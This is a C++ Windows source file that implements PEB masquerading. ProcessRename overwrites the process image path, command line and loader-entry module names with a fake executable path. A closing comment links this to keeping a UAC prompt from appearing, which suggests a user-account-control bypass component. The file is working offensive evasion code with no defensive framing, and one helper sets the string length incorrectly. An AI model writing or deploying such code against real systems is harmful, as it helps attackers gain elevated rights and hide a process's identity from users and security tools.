#pragma once
#include "loader.h"
#include "autofree.h"
#include <wchar.h>

#pragma comment(lib, "ntdll")

PVOID GetDllImport(PCCH DllName, PCCH FunctionName)
{
    if (HMODULE Module = GetModuleHandleA(DllName);Module) {
        return GetProcAddress(Module, FunctionName);
    }
    return nullptr;
}
// Returns the address of the LDR_DATA_TABLE_ENTRY for the module identified by address
// Uses the undocumented API ntdll!LdrFindEntryForAddress()
PVOID GetEntryByAddress(PVOID Address)
{
    auto LdrFindEntryForAddress = static_cast<nt::LdrFindEntryForAddress_t>(GetDllImport("ntdll.dll", "LdrFindEntryForAddress"));
    PVOID Entry{};
    LdrFindEntryForAddress(Address, &Entry);
    return Entry;
}

// Returns the address of the LDR_DATA_TABLE_ENTRY for the module identified by ModuleName
PVOID GetEntrybyName(PCCH ModName)
{
    auto ModBase = static_cast<PVOID>(GetModuleHandleA(ModName));
    return GetEntryByAddress(ModBase);
}
// Returns the pointer to the PEB of the current process
// Uses the undocumented API ntdll!RtlGetCurrentPeb
PEB* GetLocalPeb()
{
    auto RtlGetCurrentPeb = static_cast<nt::RtlGetCurrentPeb_t>(GetDllImport("ntdll", "RtlGetCurrentPeb"));
    return RtlGetCurrentPeb();
}
// Given a Unicode string containing the full path, 
// Initialize a Unicode string with the filename component of the path
// Used to initialize BaseDllName from FullDllName
bool FileNameFromUnicodePath(PUNICODE_STRING PathUC, PUNICODE_STRING FileUC)
{
    PCWCH FileW{};
    FileW = wcsrchr(PathUC->Buffer, '\\');
    if (!FileW) {
        return false;
    }
    FileW++;
    RtlInitUnicodeString(FileUC, FileW);
    return true;
}

// Converts an ASCIISZ string to a Unicode string
bool StringAtoU(PUNICODE_STRING StringU, PCCH StringA, ULONG ExctraChars)
{
    SIZE_T StringCc = strlen(StringA);
    SIZE_T TotalChars = (StringCc + ExctraChars + 1);
    auto StringW = static_cast<PWCHAR>(HeapAlloc(GetProcessHeap(), 0, TotalChars * sizeof(WCHAR)));
    if (!StringW)
    {
        return false;
    }

    // format the ASCII string into the WCHAR buffer
    swprintf_s(StringW, TotalChars, L"%hs", StringA);

    // UNICODE_STRING.Length is in bytes (not chars) not including the NULL
    StringU->Buffer = StringW;
    StringU->Length = static_cast<USHORT>(StringCc * sizeof(WCHAR));
    StringU->MaximumLength = StringU->Length = static_cast<USHORT>(TotalChars * sizeof(WCHAR));

    return true;
}
// Converts an ASCIISZ string to WCHARSZ string
// WCHARSZ string is dynamically allocated and must be freed using FreeString()

PWCHAR StringAtoW(PCCH StringA, ULONG ExtraChars)
{
    SIZE_T StringCc = strlen(StringA);
    SIZE_T TotalChars = (ExtraChars + StringCc + 1);
    auto StringW = static_cast<PWCHAR>(HeapAlloc(GetProcessHeap(), 0, TotalChars * sizeof(WCHAR)));
    if (!StringW) {
        return nullptr;
    }
    // format the ASCII string into the WCHAR buffer
    swprintf_s(StringW, TotalChars, L"%hs", StringA);
    return StringW;
}

// The following internal data structure fields point to same string:
// -RTL_USER_PROCESS_PARAMETERS.ImagePathName
// -LDR_DATA_TABLE_ENTRY.FullDllName
// -LDR_DATA_TABLE_ENTRY.BaseDllName
// This string along with RTL_USER_PROCESS_PARAMETERS.CommandLine
// are a part of a larger allocation pointed to by PEB.ProcessParameters
// ExecutablePath parameter is the full path to the fake process image name
bool ProcessRename(PCCH ExecPath)
{
    auto RtlAcquirePebLock = static_cast<nt::RtlAcquirePebLock_t>(GetDllImport("ntdll.dll", "RtlAcquirePebLock"));
    auto RtlReleasePebLock = static_cast<nt::RtlReleasePebLock_t>(GetDllImport("ntdll.dll", "RtlReleasePebLock"));

    PPEB Peb = GetLocalPeb();

    auto ProcessParam = reinterpret_cast<nt::PRTL_USER_PROCESS_PARAMETERSX>(Peb->ProcessParameters);
    // Create a Unicode string representing the new process name.
    // Memory for the Unicode string is allocated from the NTDLL heap.
    UNICODE_STRING ExecPathU{ };
    if (!StringAtoU(&ExecPathU, ExecPath, 0))
    {
        return false;
    }
    AutoFreeStringU AFSExecPathU(&ExecPathU);

    // Acquire the critical section PEB.FastPebLock
    // to protect modifications to the PEB and loader data structures
    RtlAcquirePebLock();

    // Modify the name of the process executable in the PEB
    // PEB.ProcessParameters->ImagePathName
    ProcessParam->ImagePathName = ExecPathU;

    // PEB.ProcessParameters->CommandLine
    ProcessParam->CommandLine = ExecPathU;

    // Get the base address of the EXE file for the process
    // PEB.ImageBaseAddress
    // GetModuleHandleA(NULL) can also be used instead
    PVOID ImageBaseAddr = nt::peb::ImageBase(Peb);

    //PVOID ImageBaseAddr = GetModuleHandleA(NULL);
    // Get the loader entry for the executable image
    auto Entry = static_cast<nt::PLDR_DATA_TABLE_ENTRYX>(GetEntryByAddress(ImageBaseAddr));

    // Modify the executable name in the loader entry structure
    UNICODE_STRING BaseDllName{ };

    // Set BaseDllName to point to the file name component
    FileNameFromUnicodePath(&ExecPathU, &BaseDllName);

    // Modify LDR_DATA_TABLE_ENTRY.FullDllName
    Entry->FullDllName = ExecPathU;
    // Modify LDR_DATA_TABLE_ENTRY.FullDllName
    Entry->BaseDllName = BaseDllName;

    // Release the critical section PEB.FastPebLock
    RtlReleasePebLock();

    //Prevents the Unicode string from being freed,
    //so the PEB and loader keep pointing to valid memory 
    // — without it, Windows falls back to the real image path and UAC pops.
    AFSExecPathU.Clear();
    return true;
}
